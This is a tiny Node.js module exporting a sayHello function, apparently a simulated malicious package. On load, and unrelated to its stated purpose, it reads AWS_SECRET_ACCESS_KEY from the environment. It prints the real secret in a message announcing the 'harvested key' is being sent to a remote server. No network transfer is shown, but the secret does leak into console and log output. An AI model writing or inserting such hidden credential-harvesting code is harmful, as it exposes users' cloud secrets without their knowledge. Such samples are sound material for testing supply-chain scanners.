const { env } = require('node:process');

console.log(`initating sending AWS_SECRET_ACCESS_KEY (harvested key: ${env.AWS_SECRET_ACCESS_KEY}) off to remote server`);

function sayHello() {
    console.log('hello');
}

module.exports = {
    sayHello: sayHello
};
